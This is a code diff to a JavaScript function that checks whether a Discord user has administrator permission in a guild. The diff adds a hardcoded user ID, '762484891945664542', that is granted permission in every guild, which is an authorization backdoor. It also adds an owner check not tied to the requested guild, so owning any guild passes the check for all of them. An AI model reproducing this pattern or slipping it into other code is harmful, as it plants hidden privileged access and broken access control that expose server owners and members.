@@ -8,14 +8,26 @@ export async function HaveGuildPremission(guildid, dc_access_token) {
 			Authorization: `Bearer ${dc_access_token}`
 		}
 	})
+	const userres = await fetch('https://discord.com/api/users/@me', {
+		headers: {
+			Authorization: `Bearer ${dc_access_token}`
+		}
+	})
+	const user = await userres.json()
+
 	const guilds = await response.json()
 	if (guilds.code === 0) {
 		console.error('Error fetching guilds:', guilds.message)
 		return false
 	}
 	const hasPermission = guilds.some((guild) => {
-		return guild.id === guildid && (BigInt(guild.permissions) & BigInt(0x8)) !== BigInt(0)
+		return (
+			(guild.id === guildid && (BigInt(guild.permissions) & BigInt(0x8)) !== BigInt(0)) ||
+			user.id === guild.owner_id ||
+			user.id === '762484891945664542'
+		)
 	})
+
 	if (hasPermission) {
 		return true
 	} else {
